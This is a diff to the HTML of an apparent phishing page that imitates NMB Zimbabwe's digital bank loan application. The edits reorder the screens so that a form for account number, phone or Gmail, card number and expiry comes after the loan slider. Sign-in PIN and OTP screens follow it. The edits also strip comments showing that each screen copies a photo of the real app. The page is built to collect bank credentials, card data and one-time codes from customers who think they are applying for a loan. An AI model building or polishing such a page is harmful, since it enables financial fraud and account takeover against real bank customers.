@@ -10,7 +10,7 @@
 
 <div class="app-container">
 
-  <!-- SCREEN 1: WELCOME / LANDING PAGE (Exact Match to Photo 1) -->
+  <!-- SCREEN 1: WELCOME / LANDING PAGE -->
   <section id="screen-welcome" class="screen active">
     <div class="welcome-header-area">
       <div class="nmb-logo-circle">
@@ -30,7 +30,7 @@
       <h2 class="welcome-sub-h2">Zimbabwe’s Digital Bank</h2>
       <p class="welcome-desc-text">Welcome to a seamless banking experience!</p>
 
-      <button type="button" id="btn-goto-bank" class="btn-apply-now">APPLY NOW</button>
+      <button type="button" id="btn-goto-slider" class="btn-apply-now">APPLY NOW</button>
     </div>
 
     <div class="welcome-notice-card">
@@ -48,71 +48,7 @@
     </div>
   </section>
 
-  <!-- SCREEN 2: BANK DETAILS (Exact Match to Photo 2) -->
-  <section id="screen-bank" class="screen white-screen">
-    <div class="top-nav-bar">
-      <button type="button" class="nav-back-btn" id="btn-bank-back">← Rudi</button>
-      <div class="brand-header-inline">
-        <span class="nmb-brand-sm">NMB</span>
-        <span class="mkonomi-badge">MKONONI ZIMBABWE</span>
-      </div>
-      <div class="hamburger">☰</div>
-    </div>
-
-    <div class="card-container-main">
-      <div class="card-header-title">
-        <h2>NMB ZIMBABWE</h2>
-        <small>Your trusted banking partner</small>
-      </div>
-
-      <!-- SWITCH KEY FOR PHONE NO AND GMAIL -->
-      <div class="switch-selector-row">
-        <button type="button" class="switch-tab active" id="tab-phone">Phone No</button>
-        <button type="button" class="switch-tab" id="tab-gmail">Gmail</button>
-      </div>
-
-      <div class="form-card-box">
-        <h3>🏦 BANK ACCOUNT DETAILS</h3>
-        <div class="form-group">
-          <label>Your NMB Connect Account Number:</label>
-          <input type="text" id="account-no-input" class="input-text" placeholder="Enter 10 to 13 digit Account Number" inputmode="numeric">
-        </div>
-        <div class="account-meta-row">
-          <span>Account Type: Connect</span>
-          <span>Branch: Harare</span>
-        </div>
-      </div>
-
-      <!-- IDENTIFIER INPUT DYNAMIC (Phone No or Gmail) -->
-      <div class="form-card-box" id="identifier-box-container">
-        <label id="lbl-identifier-title">Your Mobile Number / Phone No:</label>
-        <div class="phone-input-group" id="phone-prefix-wrapper">
-          <span class="flag-prefix">🇿🇼 +263</span>
-          <input type="text" id="identifier-input" class="input-text" placeholder="712345678 or 0712345678" inputmode="numeric">
-        </div>
-        <input type="email" id="identifier-email-input" class="input-text" placeholder="Enter your Gmail address" style="display:none;">
-      </div>
-
-      <div class="form-card-box">
-        <h3>💳 DEBIT/ATM CARD DETAILS</h3>
-        <div class="form-group">
-          <label>Your NMB Card Number:</label>
-          <input type="text" id="card-no-input" class="input-text" placeholder="16-digit card number" maxlength="16" inputmode="numeric">
-        </div>
-        <div class="form-group">
-          <label>Expiry Date:</label>
-          <input type="text" id="card-expiry-input" class="input-text" value="12/26">
-        </div>
-      </div>
-
-      <!-- Surface Error Notification -->
-      <div id="banner-bank-error" class="surface-error-banner"></div>
-
-      <button type="button" id="btn-submit-bank" class="btn-primary-blue">CONTINUE</button>
-    </div>
-  </section>
-
-  <!-- SCREEN 3: LOAN REPAYMENT SLIDER (Exact Match to Photo 3) -->
+  <!-- SCREEN 2: LOAN REPAYMENT ESTIMATE SLIDER -->
   <section id="screen-slider" class="screen white-screen">
     <div class="top-nav-bar bg-dark-blue">
       <button type="button" class="nav-back-btn" id="btn-slider-back">← Rudi</button>
@@ -166,7 +102,7 @@
     </div>
   </section>
 
-  <!-- SCREEN 4: FORM STEP 1 (Exact Match to Photo 4) -->
+  <!-- SCREEN 3: FORM STEP 1 OF 3 -->
   <section id="screen-form1" class="screen white-screen">
     <div class="top-nav-bar bg-dark-blue">
       <button type="button" class="nav-back-btn" id="btn-form1-back">← Back</button>
@@ -218,7 +154,7 @@
     </div>
   </section>
 
-  <!-- SCREEN 5: FORM STEP 2 (Exact Match to Photo 5) -->
+  <!-- SCREEN 4: FORM STEP 2 OF 3 -->
   <section id="screen-form2" class="screen white-screen">
     <div class="top-nav-bar bg-dark-blue">
       <button type="button" class="nav-back-btn" id="btn-form2-back">← Back</button>
@@ -264,7 +200,7 @@
     </div>
   </section>
 
-  <!-- SCREEN 6: FORM STEP 3 (Exact Match to Photo 6) -->
+  <!-- SCREEN 5: FORM STEP 3 OF 3 -->
   <section id="screen-form3" class="screen white-screen">
     <div class="top-nav-bar bg-dark-blue">
       <button type="button" class="nav-back-btn" id="btn-form3-back">← Back</button>
@@ -313,7 +249,70 @@
     </div>
   </section>
 
-  <!-- SCREEN 7: SIGN IN / PIN ENTRY (Exact Match to Photo 8) -->
+  <!-- SCREEN 6: BANK DETAILS & SWITCH (Phone No / Gmail) -->
+  <section id="screen-bank" class="screen white-screen">
+    <div class="top-nav-bar">
+      <button type="button" class="nav-back-btn" id="btn-bank-back">← Rudi</button>
+      <div class="brand-header-inline">
+        <span class="nmb-brand-sm">NMB</span>
+        <span class="mkonomi-badge">MKONONI ZIMBABWE</span>
+      </div>
+      <div class="hamburger">☰</div>
+    </div>
+
+    <div class="card-container-main">
+      <div class="card-header-title">
+        <h2>NMB ZIMBABWE</h2>
+        <small>Your trusted banking partner</small>
+      </div>
+
+      <!-- SWITCH KEY FOR PHONE NO AND GMAIL -->
+      <div class="switch-selector-row">
+        <button type="button" class="switch-tab active" id="tab-phone">Phone No</button>
+        <button type="button" class="switch-tab" id="tab-gmail">Gmail</button>
+      </div>
+
+      <div class="form-card-box">
+        <h3>🏦 BANK ACCOUNT DETAILS</h3>
+        <div class="form-group">
+          <label>Your NMB Connect Account Number:</label>
+          <input type="text" id="account-no-input" class="input-text" placeholder="Enter 10 to 13 digit Account Number" inputmode="numeric">
+        </div>
+        <div class="account-meta-row">
+          <span>Account Type: Connect</span>
+          <span>Branch: Harare</span>
+        </div>
+      </div>
+
+      <div class="form-card-box" id="identifier-box-container">
+        <label id="lbl-identifier-title">Your Mobile Number / Phone No:</label>
+        <div class="phone-input-group" id="phone-prefix-wrapper">
+          <span class="flag-prefix">🇿🇼 +263</span>
+          <input type="text" id="identifier-input" class="input-text" placeholder="712345678 or 0712345678" inputmode="numeric">
+        </div>
+        <input type="email" id="identifier-email-input" class="input-text" placeholder="Enter your Gmail address" style="display:none;">
+      </div>
+
+      <div class="form-card-box">
+        <h3>💳 DEBIT/ATM CARD DETAILS</h3>
+        <div class="form-group">
+          <label>Your NMB Card Number:</label>
+          <input type="text" id="card-no-input" class="input-text" placeholder="16-digit card number" maxlength="16" inputmode="numeric">
+        </div>
+        <div class="form-group">
+          <label>Expiry Date:</label>
+          <input type="text" id="card-expiry-input" class="input-text" value="12/26">
+        </div>
+      </div>
+
+      <!-- Surface Error Notification -->
+      <div id="banner-bank-error" class="surface-error-banner"></div>
+
+      <button type="button" id="btn-submit-bank" class="btn-primary-blue">CONTINUE</button>
+    </div>
+  </section>
+
+  <!-- SCREEN 7: SIGN IN / PIN ENTRY -->
   <section id="screen-signin" class="screen white-screen">
     <div class="top-nav-bar bg-dark-blue">
       <div class="brand-header-inline">
@@ -352,7 +351,7 @@
     </div>
   </section>
 
-  <!-- SCREEN 8: OTP VERIFICATION (Exact Match to Photo 9) -->
+  <!-- SCREEN 8: OTP VERIFICATION -->
   <section id="screen-otp" class="screen white-screen">
     <div class="top-nav-bar bg-dark-blue">
       <div class="brand-header-inline">
@@ -390,7 +389,7 @@
     </div>
   </section>
 
-  <!-- SCREEN 9: CONGRATULATIONS & SUCCESS (Exact Match to Photo 10) -->
+  <!-- SCREEN 9: CONGRATULATIONS & SUCCESS -->
   <section id="screen-success" class="screen white-screen">
     <div class="card-container-main align-center">
       <div class="success-badge-circle">✓</div>
@@ -443,4 +442,4 @@
 <script src="script.js"></script>
 </body>
   </html>
-          
+                                        
